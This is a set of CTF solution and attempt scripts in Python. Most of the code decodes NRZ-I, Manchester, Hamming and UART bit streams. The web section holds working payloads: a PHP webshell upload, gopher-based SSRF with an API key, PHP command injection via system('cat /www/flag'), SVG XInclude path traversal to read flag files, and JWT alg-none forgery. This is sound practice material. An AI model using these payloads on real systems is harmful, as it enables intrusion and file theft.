        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        # result = &#34;&#34;
        # current = &#34;0&#34;
        # for bit in bits:
        #     if bit == &#34;1&#34;:
        #         # toggle the signal
        #         current = &#34;1&#34; if current == &#34;0&#34; else &#34;0&#34;
        #     # bit == &#34;0&#34; means no change
        #     result += current
        # return result
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;
        if not bits:
            return &#34;&#34;

        decoded = []
        prev_bit = &#34;1&#34;  # Start with high voltage as reference

        for bit in bits:
            if bit == prev_bit:
                decoded.append(&#34;0&#34;)
            else:
                decoded.append(&#34;1&#34;)
            prev_bit = bit

        return &#34;&#34;.join(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_manchester(self, bits: str) -&gt; str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)

        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -&gt; indices 2,4,5,6
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_uart(self, bits, baud_rate=9600):
        &#34;&#34;&#34;
        Decode UART (Universal Asynchronous Receiver-Transmitter) encoded bits.
        UART uses start/stop bits and sends LSB first with no clock signal.
        Assumes 8 data bits, 1 start bit (0), 1 stop bit (1), no parity.
        &#34;&#34;&#34;
        if len(bits) &lt; 10 or bits[0] != &#34;0&#34;:
            return &#34;&#34;  # Invalid UART frame

        char_bits = []
        # Extract the 8 data bits (bits 1-8)
        data_bits = bits[1:9]
        # UART sends LSB first, so we need to reverse
        data_bits = data_bits[::-1]
        char_int = int(data_bits, 2)

        try:
            return chr(char_int)
        except ValueError:
            return &#34;&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        print(round_text)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        decoded = self.ascii_converter(decoded)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def main(self):

        text = &#34;011011101110000100111001000010010011111011110000&#34;
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = &#34;100110010110101000011000111110011000101010&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = &#34;001101010010100001101100011011001&#34;
        start = time.time()
        text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f&#34;time: {time.time() - start}&#34;)
        # print(decoded)

        return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            self.getting_round()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f&#34;Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}&#34;
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f&#34;Rest of bits: {rest_of_bits}&#34;)

        return valid_bits + rest_of_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater(self, bits: list):
        bits = [0] * (len(bits) % 8) + bits
        return bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_nrzi(self, bits: str) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
        # print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def main(self):

        self.requests = []

        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # text = &#34;001011111001100110010011100000111010010110100011&#34;
        # text = &#34;010010000110001110110000&#34;
        # text = &#34;100010001010101000&#34;
        # decoded_result = &#34;110110101010101011&#34;
        # text = &#34;001000111000100001001010&#34;
        # decoded = self.decode_nrzi(text)
        # print(decoded)

        # return
        # text = &#34;100110010110101000011000111110011000101010&#34;
        # decoded = self.decode_hamming74(text)
        # # return

        # text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        # decoded = self.decode_hamming74(text)

        # #

        # text = &#34;001101010010100001101100011011001&#34;
        # text = &#34;01110110011&#34;
        # start = time.time()
        # # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        # test = &#34;0110001100101110111001011101110010110001100100000101001&#34;

        # print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # # print(decoded)

        # test = &#34;01110011011000001010010111011100100010011011000010110110010110100100101111011&#34;
        # 0 11100110 1 1
        # 0 00001010 0 1
        # 0 11101110 0 1
        # 0 00100110 1 1
        # 0 00010110 1 1
        # 0 01011010 0 1
        # 0 01011110 1 1

        # for i in range(len(test) // 11):
        #     print(
        #         f&#34;start: {test[i*11]} | bits: {test[i*11 + 1:(i*11)+8 + 1]} | parity: {test[i*11 + 9 ]} | stop: {test[i*11 + 10]}&#34;
        #     )

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Blackjack/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def initiate_connection(self):
        self.client = ModbusTcpClient(self.url, port=self.port)
        self.client.connect()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def bruteforce_address(self, start=0, number=1000, count=125, verbose=False):
        if start &gt; number:
            raise ValueError(
                &#34;Start address must be less than the number of addresses to check.&#34;
            )
        for i in range(start, number):
            result = self.client.read_holding_registers(address=i, count=count)

            if any(result.registers) and result.registers[-1] == 0:
                return i
            if verbose:
                print(f&#34;Reading holding registers at address {i}...&#34;)
                if not result.isError():
                    print(&#34;Registers:&#34;, result.registers)
                else:
                    print(&#34;Error reading registers:&#34;, result)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def get_registers(self, address, count=125):
        result = self.client.read_holding_registers(address=address, count=count)
        if not result.isError():
            return result.registers
        else:
            print(&#34;Error reading registers:&#34;, result)
            return None

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def main(self):
        self.initiate_connection()
        address = self.bruteforce_address(verbose=True)
        print(address)  # 935
        registers = self.get_registers(address)
        flag = &#34;&#34;.join(chr(r) for r in registers if r != 0)
        print(flag)
        self.client.close()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def socket_initiate_connection(self):

        with socket.create_connection((self.url, self.port), timeout=10) as s:
            # Receive initial banner or prompt
            data = s.recv(4096)
            print(&#34;Received:&#34;, data.decode(errors=&#34;ignore&#34;))

            # Example: send a newline or command if required by the challenge
            s.sendall(b&#34;\n&#34;)
            response = s.recv(4096)
            print(&#34;Response:&#34;, response.decode(errors=&#34;ignore&#34;))

            # Try common commands if it&#39;s a text interface
            for cmd in [b&#34;status\n&#34;, b&#34;secret\n&#34;, b&#34;help\n&#34;, b&#34;info\n&#34;]:
                s.sendall(cmd)
                resp = s.recv(4096)
                print(f&#34;Sent {cmd.strip().decode()}: {resp.decode(errors=&#39;ignore&#39;)}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_initiate_connection(self):
        # try:
        with LogixDriver(&#34;challenge.hackthat.site/55373&#34;) as plc:
            print(&#34;Connected to PLC&#34;)
            tag_value = plc.read(&#34;Flag&#34;)
            print(f&#34;Flag value: {tag_value}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def snap_initiate_connection(self):
        self.client = Client()
        self.client.connect(self.url, self.port)
        result = self.client.read_area(
            area=snap7_util.snap7.types.Areas.DB, db_number=1, start=0, size=100
        )
        print(result)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_work(self, solution, plc):

        print(plc.get_tags())

        return

        tag = LogixTag(name=&#34;Flag&#34;, tag_type=LogixTagType.STRING)
        plc.add_tag(tag)

        # Read the flag from the PLC
        flag = plc.read(&#34;Flag&#34;)
        if flag:
            print(f&#34;Flag: {flag.value}&#34;)
        else:
            print(&#34;Failed to read the flag from PLC&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def main(self):
        self.plc_initiate_connection()

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def __init__(self, conn: str, file: str, url: str, port: str, **args):
        super().__init__(conn, file, url, port)
        self.pwn.context.log_level = &#34;error&#34;
        self.ip = args.HOST
        self.rpc_port = args.RPC_PORT
        self.tcp_port = args.TCP_PORT
        self.RPC_URL = f&#34;http://{self.ip}:{int(self.rpc_port)}/&#34;
        self.tcp_url = f&#34;{self.ip}:{int(self.tcp_port)}&#34;

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def main(self):

        # self.initiate_connection()

        connection_info = {}

        # connect to challenge handler and get connection info
        with self.pwn.remote(
            self.TCP_URL.split(&#34;:&#34;)[0], int(self.TCP_URL.split(&#34;:&#34;)[1])
        ) as p:
            p.sendlineafter(b&#34;action? &#34;, b&#34;1&#34;)
            data = p.recvall()

        lines = data.decode().split(&#34;\n&#34;)
        for line in lines:
            if line:
                key, value = line.strip().split(&#34; :  &#34;)
                connection_info[key] = value

        print(connection_info)
        self.pvk = connection_info[&#34;Private key    &#34;]
        self.setup = connection_info[&#34;Setup contract &#34;]
        target = connection_info[&#34;Target contract&#34;]

        while True:
            # try luck
            self.csend(target, &#34;pullTrigger()&#34;)

            # get flag
            with self.pwn.remote(
                self.TCP_URL.split(&#34;:&#34;)[0], int(self.TCP_URL.split(&#34;:&#34;)[1])
            ) as p:
                p.recvuntil(b&#34;action? &#34;)
                p.sendline(b&#34;3&#34;)
                flag = p.recvall().decode()

            if &#34;HTB&#34; in flag:
                print(f&#34;\n\n[*] {flag}&#34;)
                break

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def csend(self, contract: str, fn: str, *args):
        print(
            f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url  {self.RPC_URL} --private-key {self.pvk}&#34;
        )
        system(
            f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url {self.RPC_URL} --private-key {self.pvk}&#34;
        )

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def reconstructing_url(self):
        self.complete_url = f&#34;http://{self.url}:{self.port}&#34;

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def send_file(self, file):
        url = self.complete_url + &#34;/upload&#34;
        with open(file, &#34;rb&#34;) as f:
            files = {&#34;file&#34;: f}
            response = requests.post(url, files=files)
        if response.status_code == 200:
            return response.json()
        else:
            return response.text

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def get_request(self, path):
        url = &#34;/&#34;.join([self.complete_url, path])
        response = requests.get(url)
        if response.status_code == 200:
            # return response.json()
            return response.text
        else:
            return response.text

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def main(self):
        self.reconstructing_url()
        # robots = self.get_request(&#34;robots.txt&#34;)
        # print(robots)
        # instructions = self.get_request(&#34;instructions.txt&#34;)
        # print(instructions)
        payload = self.Path(self.folder_payloads, &#34;webshell.png.php&#34;)
        self.send_file(payload)

        # /home/figaro/CTF/Categories/Web/bsides/PageOneHTML/payloads/solution.py
    def main(self):

        url = &#34;http://94.237.59.174:59356/api/convert&#34;
        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}
        data = {
            # &#34;markdown_content&#34;: &#34;![flag](gopher://127.0.0.1:80/_GET /api/dev HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)&#34;,
            # &#34;markdown_content&#34;: &#34;![test](http://127.0.0.1/)&#34;,
            &#34;markdown_content&#34;: &#34;![flag](gopher://127.0.0.1:80/_GET%20/api/dev%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)&#34;,
            &#34;port_images&#34;: True,
        }

        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            print(&#34;Request successful!&#34;)
            print(response.json())
        else:
            print(f&#34;Request failed with status code: {response.status_code}&#34;)
            print(response.text)

        # /home/figaro/CTF/Categories/Web/bsides/SimPlay/payloads/solution.py
    def main(self):
        url = f&#34;http://{self.url}:{self.port}&#34;  # Replace with actual challenge IP or domain
        payload = &#39;Y-m-d&#34;; system(&#34;cat /www/flag&#34;); //&#39;
        payload = &#39;Y-m-d&#34;); system(&#34;ls /&#34;); //&#39;
        payload = &#39;Y-m-d&#34;); system(&#34;cat /flagxTtZD&#34;); //&#39;
        r = requests.get(url, params={&#34;format&#34;: payload})
        print(r.text)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def main(self):
        self.new_url = f&#34;http://{self.url}:{self.port}/api/generate&#34;
        self.generating()

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def generating(self):

        exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;text x=\&#34;10\&#34; y=\&#34;50\&#34; font-size=\&#34;20\&#34; fill=\&#34;black\&#34; xmlns:xi=\&#34;http://www.w3.org/2001/XInclude\&#34;&gt;&lt;xi:include href=\&#34;.?../../../../app/flag.txt\&#34; parse=\&#34;text\&#34;/&gt;&lt;/text&gt;&lt;text&gt;
                &#34;&#34;&#34;

        payload = {
            &#34;name&#34;: &#34;everywhere&#34;,
            &#34;topText&#34;: exploit,
            &#34;bottomText&#34;: &#34;lol&#34;,
        }

        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and &#34;result&#34; in response.json():
            self.meme = response.json()[&#34;result&#34;]
            self.meme_url = f&#34;http://{self.url}:{self.port}/{self.meme}&#34;
            print(self.meme_url)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def downloading(self):
        if not hasattr(self, &#34;meme_url&#34;):
            print(&#34;Meme not generated. Please run the generating step first.&#34;)
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split(&#34;/&#34;)[-1]
        if response.status_code == 200:
            with open(self.folfil(&#34;data&#34;, meme_name), &#34;wb&#34;) as f:
                f.write(response.content)
            print(&#34;Meme downloaded successfully.&#34;)
        else:
            print(&#34;Failed to download the meme.&#34;)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def main(self):
        self.new_url = f&#34;http://{self.url}:{self.port}/api/generate&#34;
        self.generating()

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def generating(self):

        # exploit = &#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;250&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;file:///app/flag.txt&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        # filename = &#34;static/memes/doge.png&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;10&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;file://{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        online_meme_url = f&#34;http://{self.url}:{self.port}/memes/doge&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;{online_meme_url}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;red&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        # filename = &#34;/flag.txt&#34;
        # filename = base64.b64encode(filename.encode()).decode()
        # data:image/png;base64,
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

        filename = &#34;/flag.txt&#34;

        # exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;file://{filename}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;
        exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;{online_meme_url}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

        # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

        print(len(exploit))
        print(exploit)

        payload = {
            &#34;name&#34;: &#34;everywhere&#34;,
            # &#34;name&#34;: &#34;doge&#34;,
            &#34;topText&#34;: &#34;lol&#34;,
            &#34;bottomText&#34;: exploit,
        }

        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and &#34;result&#34; in response.json():
            self.meme = response.json()[&#34;result&#34;]
            self.meme_url = f&#34;http://{self.url}:{self.port}/{self.meme}&#34;
            print(self.meme_url)

        # /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def downloading(self):
        if not hasattr(self, &#34;meme_url&#34;):
            print(&#34;Meme not generated. Please run the generating step first.&#34;)
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split(&#34;/&#34;)[-1]
        if response.status_code == 200:
            with open(self.folfil(&#34;data&#34;, meme_name), &#34;wb&#34;) as f:
                f.write(response.content)
            print(&#34;Meme downloaded successfully.&#34;)
        else:
            print(&#34;Failed to download the meme.&#34;)

        # /home/figaro/CTF/Categories/Web/ECSC/Popcorn_and_Payloads/payloads/solution.py
    def main(self):
        self.completed_url = f&#34;http://{self.url}:{self.port}&#34;

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def create_token(self, username):
        header = {&#34;alg&#34;: &#34;none&#34;, &#34;typ&#34;: &#34;JWT&#34;}
        return jwt.encode(
            {&#34;username&#34;: username}, key=None, algorithm=&#34;none&#34;, headers=header
        )

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def pollute(self, base_url):
        payload = {
            &#34;user.username&#34;: &#34;nikolas&#34;,
            &#34;user.password&#34;: &#34;nikolas&#34;,
